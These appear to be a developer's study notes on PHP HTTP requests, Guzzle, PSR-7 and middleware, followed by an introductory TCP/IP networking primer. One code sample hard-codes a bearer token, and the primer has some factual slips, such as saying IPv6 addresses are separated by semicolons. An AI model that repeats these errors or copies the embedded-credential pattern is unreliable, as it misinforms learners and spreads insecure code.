$url = 'http://localhost/book/post-form-page.php';
<p>
$data = ["email" => "lorna@example.com", "display_name" => "LornaJane"];
<p>
$options = ["http" =>
<p>
   ["method" => "POST",
<p>
       "header" => "Content-Type: application/x-www-form-urlencoded",
<p>
       "content" => http_build_query($data)
<p>
   ]
<p>
];
<p>
<strong>echo </strong>file_get_contents($url, <strong>NULL</strong>, stream_context_create($options));
   </td>
  </tr>
</table>




1.  Guzzle

[http://docs.guzzlephp.org/en/latest/](http://docs.guzzlephp.org/en/latest/)



*   POST request as earlier

require "vendor/autoload.php";

$url = "http://requestb.in/example";

$data = ["name" => "Lorna", "email" => "lorna@example.com"];

$client = new \GuzzleHttp\Client();

$result = $client->post($url, ["json" => $data]);

echo $result->getBody();


```
use Guzzle\Http\Client;

$headers = [
   'Authorization' => 'Bearer vr5HmMkzlxKE70W1y4MibiJUusZwZC25NOVBEx3BD1',
   'Content-Type' => 'application/json',
];
$payload = [
   'user_id' => 2
];

// Create a client and provide a base URL
$client = new Client('http://api.example.com');
$req = $client->post('/moments/1/gift', $headers, json_encode($payload))
```




*   POST form DATA

require "vendor/autoload.php";

$url = 'http://localhost/book/post-form-page.php';

$data = ["email" => "lorna@example.com", "display_name" => "LornaJane"];

$client = new \GuzzleHttp\Client();

$page = $client->post($url, ["form_params" => $data]);

echo $page->getBody();

there is also a **multipart** option if you need to send file uploads using Guzzle


## HTTP Verbs

GET, POST, DELETE,  PUT, PATCH



*   inspecting the $_SERVER["REQUEST_METHOD"] value, which indicates which verb was used in the request.


## HTTP header and Code

HTTP is a stateless protocol. This means that each request is handled independently of all the other requests and it means that a server or a script cannot remember if a user has been there before. However, knowing if a user has been there before is often required and therefore something known as cookies and sessions have been implemented in order to cope with that problem

**Check API doc.**


### header	-	Sets an HTTP header / Send a raw HTTP header

[http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)


### headers_list — Returns a list of response headers sent (or ready to send)

[http://php.net/manual/en/function.headers-list.php](http://php.net/manual/en/function.headers-list.php)


### headers_sent — Checks if or where headers have been sent

[http://php.net/manual/en/function.headers-sent.php](http://php.net/manual/en/function.headers-sent.php)


### header_remove — Remove previously set headers

[http://php.net/manual/en/function.header-remove.php](http://php.net/manual/en/function.header-remove.php)


###### Components of the Url

Url : http://www.mhr.com/php-exercises/php-basic-exercises.php


```
$url = 'http://www.mhr.com/php-exercises/php-basic-exercises.php';
$url= parse_url($url);
echo 'Scheme : ' . $url['scheme']. PHP_EOL;
echo 'Host : ' . $url['host']. PHP_EOL;
echo 'Path : ' . $url['path']. PHP_EOL;
```


[https://www.w3.org/DesignIssues/MatrixURIs.html](https://www.w3.org/DesignIssues/MatrixURIs.html)

[https://www.aidanwoods.com/blog/secure-headers-for-php](https://www.aidanwoods.com/blog/secure-headers-for-php)



*   [flush](http://php.net/manual/en/function.flush.php) — Flush system output buffer
*   [ob_clean](http://php.net/manual/en/function.ob-clean.php) — Clean (erase) the output buffer
*   [ob_end_clean](http://php.net/manual/en/function.ob-end-clean.php) — Clean (erase) the output buffer and turn off output buffering
*   [ob_end_flush](http://php.net/manual/en/function.ob-end-flush.php) — Flush (send) the output buffer and turn off output buffering
*   [ob_flush](http://php.net/manual/en/function.ob-flush.php) — Flush (send) the output buffer
*   [ob_get_clean](http://php.net/manual/en/function.ob-get-clean.php) — Get current buffer contents and delete current output buffer
*   [ob_get_contents](http://php.net/manual/en/function.ob-get-contents.php) — Return the contents of the output buffer
*   [ob_get_flush](http://php.net/manual/en/function.ob-get-flush.php) — Flush the output buffer, return it as a string and turn off output buffering
*   [ob_get_length](http://php.net/manual/en/function.ob-get-length.php) — Return the length of the output buffer
*   [ob_get_level](http://php.net/manual/en/function.ob-get-level.php) — Return the nesting level of the output buffering mechanism
*   [ob_get_status](http://php.net/manual/en/function.ob-get-status.php) — Get status of output buffers
*   [ob_gzhandler](http://php.net/manual/en/function.ob-gzhandler.php) — ob_start callback function to gzip output buffer
*   [ob_implicit_flush](http://php.net/manual/en/function.ob-implicit-flush.php) — Turn implicit flush on/off
*   [ob_list_handlers](http://php.net/manual/en/function.ob-list-handlers.php) — List all output handlers in use
*   [ob_start](http://php.net/manual/en/function.ob-start.php) — Turn on output buffering
*   [output_add_rewrite_var](http://php.net/manual/en/function.output-add-rewrite-var.php) — Add URL rewriter values
*   [output_reset_rewrite_vars](http://php.net/manual/en/function.output-reset-rewrite-vars.php) — Reset URL rewriter values


#### ob_start — Turn on output buffering

While output buffering is active no output is sent from the script (other than headers), instead the output is stored in an internal buffer.

The contents of this internal buffer may be copied into a string variable using **ob_get_contents**(). To output what is stored in the internal buffer, use **ob_end_flush**(). Alternatively, **ob_end_clean**() will silently discard the buffer contents

Output buffers are stackable, that is, you may call ob_start() while another ob_start() is active. Just make sure that you call ob_end_flush() the appropriate number of times. If multiple output callback functions are active, output is being filtered sequentially through each of them in nesting order.

[http://phpdeveloper.org/tag/cookie](http://phpdeveloper.org/tag/cookie)

[https://blog.madewithlove.be/post/concurrent-http-requests/](https://blog.madewithlove.be/post/concurrent-http-requests/)


## PSR7

Common interface for: http messages and URLs for use with http messages.

HTTP messages are the foundation of web development. Web browsers and HTTP clients such as cURL create HTTP request messages that are sent to a web server, which provides an HTTP response message. Server-side code receives an HTTP request message, and returns an HTTP response message.

[https://mwop.net/blog/2015-01-26-psr-7-by-example.html](https://mwop.net/blog/2015-01-26-psr-7-by-example.html)

composer require psr/http-message

[http://www.php-fig.org/psr/psr-7/](http://www.php-fig.org/psr/psr-7/)


### HTTP request message


```
POST /path HTTP/1.1
Host: example.com

foo=bar&baz=bat
```



#### HTTP Headers



*   Case-insensitive header field names
*   Headers with multiple values
*   Host header


#### Streams

[http://www.php-fig.org/psr/psr-7/#1-3-streams](http://www.php-fig.org/psr/psr-7/#1-3-streams)


#### Request Targets and URIs

[http://www.php-fig.org/psr/psr-7/#1-4-request-targets-and-uris](http://www.php-fig.org/psr/psr-7/#1-4-request-targets-and-uris)


#### Server-side Requests

[http://www.php-fig.org/psr/psr-7/#1-5-server-side-requests](http://www.php-fig.org/psr/psr-7/#1-5-server-side-requests)


#### Uploaded files

[http://www.php-fig.org/psr/psr-7/#1-6-uploaded-files](http://www.php-fig.org/psr/psr-7/#1-6-uploaded-files)


#### PSR 7 Interfaces

Psr\Http\Message\



1.  MessageInterface
1.  RequestInterface
    1.  ServerRequestInterface
1.  ResponseInterface
1.  StreamInterface
1.  UriInterface
1.  UploadedFileInterface

[http://www.php-fig.org/psr/psr-7/](http://www.php-fig.org/psr/psr-7/)

[https://mwop.net/blog/2015-07-28-on-psr7-headers.html](https://mwop.net/blog/2015-07-28-on-psr7-headers.html)

[https://fredemmott.co.uk/blog/posts/greenfield-projects-with-hack](https://fredemmott.co.uk/blog/posts/greenfield-projects-with-hack)


## HTTP Middleware

The idea is to wrap your application logic (eg: controllers) up in a way that looks like an onion, having concentric layers of stuff happening before and after the central logic runs: reading from the request and writing to the response. Some layers might notice a problem and exit early skipping your application logic altogether. Others will add headers to the response, or do other fancy stuff.

PHP was a bit late to the game with HTTP middleware, because of the way PHP's web interaction code happened. Seeing as PHP was built intentionally for the web from scratch, we've always had a bunch of ways to get to web related data. PHP had 



*   **get_apache_headers()** to read headers if it's on Apache
*   or **$_SERVER['HTTP_FOO']** to read kinda headers, 
*   **header()** to manually set response headers, 
*   **$_GET** to access query string parameters, 
*   **$_POST** to access the HTTP body if the Content-Type is application/x-www-form-urlencoded and
*   **fopen('php://input', 'r')** for the raw body otherwise.

That is quite clearly a bit shit, inconsistent and can be rather hard to fake for the purposes of testing. Regardless of being shit, it _was_ possible to access all of this stuff. Other languages like Python and Ruby didn't really have the same level of access, so they ended up building themselves some nice systems to handle it:[ Rack for Ruby](http://chneukirchen.org/blog/archive/2007/02/introducing-rack.html) and[ WSGI for Python](http://wsgi.tutorial.codepoint.net/).

[https://philsturgeon.uk/php/2016/05/31/why-care-about-php-middleware/](https://philsturgeon.uk/php/2016/05/31/why-care-about-php-middleware/)

[http://relayphp.com/](http://relayphp.com/)

[http://shadowhand.me/dependency-inversion-and-psr-7-bodies/](http://shadowhand.me/dependency-inversion-and-psr-7-bodies/)

[http://andrewcarteruk.github.io/programming/2016/05/22/psr-7-is-not-immutable.html](http://andrewcarteruk.github.io/programming/2016/05/22/psr-7-is-not-immutable.html)

[http://shadowhand.me/all-about-psr-7-middleware/](http://shadowhand.me/all-about-psr-7-middleware/)

[https://mwop.net/blog/2017-01-26-http-message-util.html](https://mwop.net/blog/2017-01-26-http-message-util.html)

Example:

[https://github.com/ircmaxell/Tari-PHP](https://github.com/ircmaxell/Tari-PHP)

/home/mhrilwan/Code/practice/src/Middleware/psr7

Example02:

/home/mhrilwan/Code/practice/src/Middleware


## HTTP MESSAGE UTIL

composer require fig/http-message-util

It provides two interfaces:



*   Fig\Http\Message\RequestMethodInterface, containing constants for HTTP request method values.
*   Fig\Http\Message\StatusCodeInterface, containing constants for HTTP status code values.

The constants are prefixed with METHOD_ and STATUS_, respectively, and use the standard names as presented in the various IETF specifications that originally define them.

[https://packagist.org/packages/http-interop/http-middleware](https://packagist.org/packages/http-interop/http-middleware)

[http://stackphp.com/](http://stackphp.com/)

[https://docs.zendframework.com/zend-stratigility/middleware/](https://docs.zendframework.com/zend-stratigility/middleware/)

[https://docs.zendframework.com/zend-stratigility/](https://docs.zendframework.com/zend-stratigility/)


## Build PSR-7 compliant application


## ROUTING 

[nikic/FastRoute](https://github.com/nikic/FastRoute)


## DotEnv

[https://github.com/vlucas/phpdotenv](https://github.com/vlucas/phpdotenv)

TCP/IP Network Protocol


###### 
    **TABLE OF CONTENTS**



1.  HISTORY
1.  OSI MODEL
1.  IP ADDRESSING
    1.  NETWORK ADDRESS TRANSLATION
1.  STATIC ROUTING
    1.  STATIC ROUTING
    1.  BROADCAST
    1.  IPV6
1.  LAYER 4 PROTOCOLS
1.  TCP PROTOCOL
    1.  THE 3-WAY HANDSHAKE
    1.  RESULTS
1.  UDP PROTOCOL
    1.  DNS
    1.  VOIP
1.  ICMP PROTOCOL
1.  ADVANCED ROUTING
1.  INTERIOR ROUTING PROTOCOLS
    1.  ROUTER INFORMATION PROTOCOL (RIP)
    1.  OPEN SHORTEST PATH FIRST (OSPF)
1.  EXTERIOR ROUTING PROTOCOLS
    1.  BORDER GATEWAY PROTOCOL (BGP/BGP4)
1.  TROUBLESHOOTING


##### **<span style="text-decoration:underline;">HISTORY</span>**

TCP/IP is a set of network protocols which is best known for connecting the machines that make up the Internet. However, it is generally assumed that the Internet started around 1995 and few people had heard of TCP/IP before then. The truth is that TCP/IP is one of the oldest network protocols and its survival is mainly based on its simplicity and universality. The underlying IP protocol knows nothing about the network state and does not attempt to make any guarantees, thus all error control must be done at the end points only.

The basics of networking were designed in the late 1960s and early 1970s. The first email was 1971, with FTP appearing in 1973. The Network Voice Protocol (precursor to VoIP) was designed in 1977, but had technical shortcomings. Our modern ethernet was designed in the 1970s by Xerox at the Palo Alto Research Center (PARC). The Xerox PUP (PARC Universal Packet) first ran in late 1974 and was the protocol most similar to modern TCP/IP (including the 16 bit port numbers). It was at Xerox that the "big dream" of personalizing computers was being realized. Until that time, computers were largely based on batch processing. It was an absolute necessity that maximal use was made of the expensive early machines, and so multitasking algorithms were developed to share a single CPU among multiple users by partitioning the CPU into small slices. The next logical step was to do the same to the wires that connected one "personal" machine to another. By sending information in small packets, you can send different packets to different destinations. This is generally referred to as packet switching.

The original IP protocol became official in RFC 675 in December of 1974 and started talking on networks in 1975 as the Transmission Control Program (TCP; although it's now Protocol, not Program). There were a number of independant achievements, mainly because Xerox had a history of dropping the ball and not sharing information, even for profit. ARPANET started around 1969, but didn't officially adopt TCP/IP until 1982! Back in 1972, Robert Kahn at DARPA was working with satellite and radio networks and saw the value of a protocol that could span both. By 1973, Kahn and Vinton Cerf had worked out the basis of the "Internetwork Protocol" who's key feature was that reliability would be delegated to the hosts, allowing for an unparalleled degree of flexibility. It was based heavily on the Xerox PUP running on Ethernet, rather than the existing NCP (Network Control Program) used by Arpanet at the time. By 1978, TCP (version 3) was redefined as just the transport layer, while the network layer was named the Internetwork Protocol (IP). This gave rise to the name TCP/IP as the new common name. Later on, the connectionless portion developed into what we call the User Datagram Protocol (UDP), which runs on top of the IP protocol, but with no new name changes. Our IP version 4 dates to 1980.


##### **<span style="text-decoration:underline;">OSI MODEL</span>**

Let's briefly discuss the different layers of the OSI model. This helps us understand what is built on what, and how it all fits together.



1.  **Physical Layer** - This is plain and simple. It's the network wire itself. It might be thin or thick coaxial ethernet cable with resistor terminations, twisted-pair (the most commonly known these days), or even wireless radio transmissions. This layer determines how bits are sent. There is even RFC 1149 for sending IP packets by "Avian Carrier" (yes, carrier pigeon, a joke dated April 1, 1990).
1.  
1.  **Data Link Layer** - The second layer is responsible for getting a packet over the physical layer. This layer determines how bits are organized into "frames". For ethernet, this includes collisions, etc. An example of this would be the MAC layer with its 48-bit MAC address and ethernet frames, 802.11 WiFi networks, 802.15.4 ZigBee, and PPP. The MAC addresses are generally only useful on the physical network.
1.  
1.  **Network Layer** - This is where your IP (Internet Protocol) address comes in. The IP packet defined here is contained within the data of the underlying layers. This means we can now implement more advanced networking concepts because we can take the IP packet out of its originating ethernet frame (or wherever it may have come from) and wrap it into a new frame on a completely new network. This is why it's called "Inter-net".
1.  
1.  **Transport Layer** - This layer provides for the ability to perform error detection, error recovery, connection information, data sequencing, and the like. Both the UDP and TCP protocols reside in this layer, each for different purposes. Although note that the UDP protocol doesn't do most of these - it just identifies the remote service by UDP port number. Different TCP and UDP services listen on different ports and new outgoing connections have a port number.
1.  
1.  **Session Layer** - UDP is sessionless protocol, but TCP allocates a sequence number that keeps track of the packets within a session. The source and destination IP addresses and source and destination port numbers of the transport layer identify the connection for which we keep track of the packet sequence for the session. This layer is sometimes called the "socket layer" because the BSD socket library (now on pretty much all machines in some form) abstracts all these details and differences.
1.  
1.  **Presentation Layer** - This layer determines the encoding of the data; ascii text, jpeg, gif, or some form of encryption which is fed into the socket.
1.  
1.  **Application Layer** - The application layer is the top layer of the stack, such as the HTTP protocol and the commands that make up the protocol.
1.  

Let's look at this another way. You want to send something through the mail. You stick an address on your envelope. This is the IP address (layer 3). We don't care if the mailbox is on the side of a house, a wall of mailboxes at an apartment complex, or what color it is. That's layer 1.  We don't care if it gets there by truck, boat, or plane, or some combination. That's layer 2.  Do you care how many post offices it stops at?  Nope … that's handled by layer 3 routing protocols that just need that layer 3 IP address.

Now, will it get there in time? Do you want a return-receipt with signature-requested? These are layer 4 issues which determines our choice between UDP or TCP. Following the analogy, layer 5 gives us a flat-rate box, layer 6 is what we stick in the box, and layer 7 determines if the box says Happy Birthday, Merry Christmas, or RMA.


##### **<span style="text-decoration:underline;">IP ADDRESSING</span>**

The most common form of IP addressing, and the easiest to understand is the IPv4 address. This uses a 32 bit (4 bytes) address size capable of a maximum of about 4 billion machines. This is the fourth generation of the protocol and is still widely used today. It is compatible with the 6th generation protocol, IPv6, which dispenses with the header checksum since most networks are fairly immune to bit-errors these days, but extends the address size to 128 bits.

The IPv4 address scheme never imagined we'd have computers in every home, much less half a dozen IP addressable devices per house. We are now looking at the Internet Of Things (IoT) where your thermostat, oven, coffee pot, and even each individual light bulb in your house may have its own IP address!

You will commonly see an IPv4 address in a "dotted quad" format, a series of 4 numbers (each byte), each from 0-255 (the values of a byte), separated by periods. An IPv6 address is generally given in hexadecimal (values 0-9 and A-F designate 4 bits of the total address), with semicolons inserted between every 4 digits (16 bits) forming a total of 8 fields. Remember that in the packet itself, you just have bits. The written representation is just for human readability.


###### **NETWORK ADDRESS TRANSLATION**

Before IPv6, a number of methods have been devised to expand the number of addresses available. The most common is called a "NAT". A NAT requires a specialized router that performs the address translation, basically translating a large number of addresses on a private network (usually using a set of reserved "non routable" IP addresses) to a smaller set of public IP addresses. In home routers, you generally will have a single public IP address that is assigned dynamically using DHCP (Dynamic Host Configuration Protocol) or assigned statically by a network service provider.

NAT is actually a bit of a hack operating mostly at Layer 4. As a new packet is sent out, the router records the local IP, destination IP, source port number, and destination port number. It stores this information in a table. It then rewrites the packet, placing its public IP into the source for packets destined to public addresses. When a packet comes in from the public network, it looks up the source IP (as the previous destination) and two port numbers in the table to find the original source of the packet. It can then overwrite the destination field of the IP packet and send it off to the local network. It's important to note that incoming connections are limited since the destination won't be in the table.

Different routers may handle incoming connections in a couple of ways. They may have a static table where specific incoming ports are sent to a specific IP address, configured by the network administrator. This process is referred to as "port forwarding". They may allow a DMZ (DeMilitarized Zone) host, where incoming packets are sent that don't otherwise have a destination. They may also simply drop incoming connections.

NATs also have problems when an IP address is sent in the upper layers of the OSI model. The NAT doesn't generally know an IP address from other data. This may make direct connections between two people behind a NAT almost impossible without additional help such as the NAT helper plugins of the Linux iptables that can recognize many common protocols. UDP applications may support the use of a STUN service to get through the NAT. With IPv6, these tricks go away and we can use real publically routable IP addresses for every light bulb in your house (with all the security implications that unravels).


##### **<span style="text-decoration:underline;">STATIC ROUTING</span>**


###### **STATIC ROUTING**

The simplest routing method, static routing, is still used by almost every machine in existence, although once you leave the local machine it's generally used only for the smallest networks. In this scheme, all routing decisions are based on an internal table. Part of the IP address is used as the "network number". All packets for a specific network are passed to that network. In the earlier days, the IP address itself could determine the network "class", which would determine the network size and netmask. Any documentation that talks about network classes these days is simply outdated and incorrect thanks to CIDR, or Classless Inter-Domain Routing. CIDR was first introduced in 1993 and was last updated in 2006, making network classes a historical oddity of the 80s.

In CIDR, all networks must have a "netmask". First, a binary AND is performed with the netmask to get the network number. Then, this network number is compared with each interface's network number. If there is a match, the packet is sent on that interface. If there is no match, then the packet is sent to the default gateway (if one exists). If there are multiple routes that match or multiple default gateways, then the matching interface with the lowest metric is chosen as the best route.

It's common to see an IP address in CIDR format which is just the machine's IP address followed by a slash, then the number of bits in the netmask. The netmask will always be filled from left to right. For example, if you see 121.34.52.88/24, then you know that the first 24 bits of the netmask are 1's (commonly written as 255.255.255.0) meaning the network number will be 121.34.52.0.


###### **BROADCAST**

The network number itself is not available for use as a host address. Another address called the broadcast address is when all host bits are 1's. In the last example, the broadcast address would be 121.34.52.255.

The broadcast address is used when you want to send a packet to all hosts on the local subnet. This can be used for a number of reasons and is often used for network discovery and various other broadcast messages. In general, you do not want broadcast messages to cross your firewall.


###### **IPV6**

While you commonly see /24 as the common CIDR netmask for IPv4 networks, it bears mention that IPv6 will use a fixed 64-bits as the smallest subnet size. Yes, the smallest subnet is 4 billion times the number of currently available IPv4 addresses. When you get an IPv6 address, you are given a block of subnets. A /128 is a single address, such as the loopback address. A /64 is a single subnet. The recommendation (as of RFC 3177) is that most sites be given a /48 block, or 64K subnets (of 264 addresses to be used internally)! Home users (according to RFC 6177) should be given a /56 block, or 256 subnets. It should be clear why you don't need NAT tricks with IPv6 and why you can give every LED in your house its own IP address, and every room its own subnet, or however you want to arrange things.


##### **<span style="text-decoration:underline;">LAYER 4 PROTOCOLS</span>**


##### **TCP PROTOCOL**

IP is designed to be as basic and flexible as possible. This means that a router may send different packets through different routes, resulting in packets being out of order. Some networks may have a smaller MTU/MSS resulting in packets being fragmented into smaller pieces. Packets may also be lost. TCP is about guaranteed delivery.

It is up to TCP to maintain the sequence of data as a single connected stream. Note that TCP (and UDP) port numbers are 16 bit which limit a host to a maximum of 65536 simultaneous connections per IP address. Let's look at how TCP does this, step-by-step.


###### **THE 3-WAY HANDSHAKE**

A connection is opened with a SYN packet with a suitably random initial sequence number (to make hijacking connections more difficult). SYN is a bit set in the TCP header contained within the IP packet. It means "let's chat" and includes any specific options that the client wants to support. When the server gets a SYN packet it knows the source and destination ports and the client's initial sequence number and it allocates space in a connection table. It then responds with SYN-ACK.

The SYN-ACK means both SYN and ACK bits are sent and tells the client that everything was received and the connection is ready to go. The client's sequence number is returned after incrementing it (it will count packets). If the server is up, but nothing is listening on the indicated port, a RST packet would have been sent instead. This tells the client what options the server supports and our own random sequence number.

Now the client must send an ACK that acknowledges that we got the SYN-ACK and our connection is open with both sides aware of all options and sequence numbers needed. This ACK will return the server's sequence number incremented by 1.


###### **RESULTS**

With all this information (and a 4-way handshake to actually close the connection), we can reassemble out of order packets, tell the other end to re-send specific packets. TCP also allows for a number of options for congestion control, selective windowed acknowledgements, out of band data, retransmissions, etc. One such example is timestamps, which allows for calculating round-trip delay. Consult Wikipedia and the relevant RFCs if you want to know all the intricacies and options available.


##### **UDP PROTOCOL**

TCP has quite a bit of overhead. Just the 3 way handshake alone can contribute to considerable latency. Sometimes, you need to get data sent fast, and it may not matter if it actually gets there. The two most common uses of UDP are for VOIP (Voice Over IP or "Internet Telephony") and DNS.


###### **DNS**

When you need to translate a name to an IP address, you look this information up in DNS servers. The actual process may require multiple successive lookups, starting with the "root" of the domain, the ".com" or ".net" at the end, through the domain, and into the hostname, often "www". You may likely have multiple caching DNS servers to speed up this process. It's common to ask all configured DNS servers for the required information and then use whatever response comes back first. All required information for the query is sent in the initial packet, and the reply contains the complete response. If the remote DNS server is down, we don't really care. No connections need to be established. This makes UDP ideal for DNS.


###### **VOIP**

For live streaming audio like a telephone conversation, latency can cause strange delays in the conversation, echo problems, and all sorts of issues. To make sure the data has the smallest latency possible, VoIP protocols generally use UDP. If a packet is missed, we approximate the missing packet's data rather than trying to resend. By the time a resend arrives, it will be too late. The delay of the audio playback must be set to the longest expected packet delay in the stream to prevent buffer underruns. If you allow for packet retransmissions, this delay would be excessive and impossible to calculate. We basically blow packets at each other and assume they get there. The protocol has a few additions to detect major problems, but you can have considerable delay before the system detects an error.


##### **ICMP PROTOCOL**

Internet Control Message Protocol is used mainly by routers and other networking gear to report problems. If you ever got a "Host Unreachable" message it's because a router couldn't reach the IP address you asked for and sent back an ICMP packet to tell you. The old ping and traceroute tools generally use ICMP packets.


##### **<span style="text-decoration:underline;">ADVANCED ROUTING</span>**

Entire books can and have been written about TCP/IP routing protocols. Here we address the most common.


##### **INTERIOR ROUTING PROTOCOLS**

Interior protocols are for routing within a network, not for routing between networks like the Internet.


###### **ROUTER INFORMATION PROTOCOL (RIP)**

You are likely to see RIP v1 and v2 for IPv4 and RIPng for IPv6. Like TCP/IP, RIP has roots in Xerox PARC as the Gateway Information Protocol (GWINFO) for running on Xerox PUP (PARC Universal Packet). In RIP, routers use a distance-vector algorithm to select lowest cost routes. RIP routers periodically broadcast information about the routes they know. This will include information such as an available host and how many network hops (the "cost") required to reach it. As routers receive this information, it can add the nearby routes, adding on to the cost. The messages sent between RIP routers use the UDP protocol.

RIP is relatively slow to reach convergence (when all routers have complete routing tables). The internal timeouts and default broadcasts means that minutes may elapse before a network change is detected. It also has no way to deal with routing loops.


###### **OPEN SHORTEST PATH FIRST (OSPF)**

The OSPF protocol is more complex, but also more capable than RIP. It dates back to the late 1989 (although was quickly changed by 1991) and it's specification is over 240 pages! Research into this type of routing protocol began at ARPANET in the 1970s. The OSPF uses a distributed database of the link-states of the network which is shared among routing peers. The cost metric used can be set up by the network administrator and is not limited to hop-counts.

OSPF can allow larger networks to use a hierarchy of routers such that routing peers only share information about the specific area to which they are assigned. This forms a tree of information called the SPF tree (Shortest Path First).

OSPF messages do not use UDP, but rather use IP datagrams with the protocol field set to 89.


##### **EXTERIOR ROUTING PROTOCOLS**

Routing within a network that a particular person or company controls is a much simpler affair than trying to route packets between independent entities. This is done via exterior protocols. There was an obsolete protocol named simply "Exterior Gateway Protocol (EGP)". Today, the protocol of choice for the Internet is BGP.


###### **BORDER GATEWAY PROTOCOL (BGP/BGP4)**

You simply can't do much justice to BGP in a paragraph or two. BGP is likely one of the most critical protocols of the Internet. BGP ensures that different organizations can share routing information. BGP comes to us from RFC1105 from 1989. It is now up to revision 4.

Border routers that know about BGP are referred to as "speakers". They don't necessarily know anything about the interior of the network system. They simply speak to other BGP routers, called "neighbors". Like simpler protocols, they use a database of information, the Routing Information Base (RIB), but the information is much more detailed. You may see the term path-vector algorithm as each data entry contains information about the entire path used to reach the given endpoint.

The BGP routers connect into network that must be pre-configured. At this point, the neighbors create TCP connections to send the routing information messages across. It will then send Open, Update, Keepalive, and Notification messages over this long-lived connection. It also bears note that ingress and egress traffic may be routed differently. The number of options in BGP is staggering.


##### **<span style="text-decoration:underline;">TROUBLESHOOTING</span>**

The best way to troubleshoot IP problems is to start with a basic "ping" to test network connectivity. You can then move on to other tests such as a "traceroute" if you are trying to reach a distant host. Remember to test names and IP addresses separately since a broken DNS can look like a connectivity problem.

Larger problems often require a network analyzer such as Wireshark. Wireshark will allow you to record a set of network transactions and then open each layer of the OSI model. For example, you open an ethernet packet to see the IP header and its data payload. The IP data payload might be a TCP packet and you can view it's header. Inside that may be an HTTP packet. Being able to see the exact sequence of data packets being sent and received over the line can save hours of guesswork. You will also want to familiarize yourself with all the individual high-level protocols and protocol extensions being used on your network.


<!-- Docs to Markdown version 1.0β14 -->
